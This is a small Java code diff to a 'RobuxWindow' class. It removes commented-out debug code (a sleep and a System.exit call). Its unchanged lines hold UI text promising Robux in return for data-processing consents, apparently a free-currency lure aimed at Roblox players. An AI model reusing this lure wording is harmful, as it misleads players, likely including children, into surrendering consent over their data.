@@ -14,13 +14,5 @@ public class RobuxWindow extends BaseWindow {
                 "We need you to mark the appropriate consents for data processing, in return for which we will reward the account given by you with the appropriate amount of Roblox.\n");
         inputDescription.setText("Account that will get Robux:");
         inputPlaceholder.setText("Input your player nick");
-
-        //TODO remove enything below while pushing into production ↓
-//        try {
-//            Thread.sleep(30000);
-//        } catch (InterruptedException e) {
-//            throw new RuntimeException(e);
-//        }
-//        System.exit(2137);
     }
 }
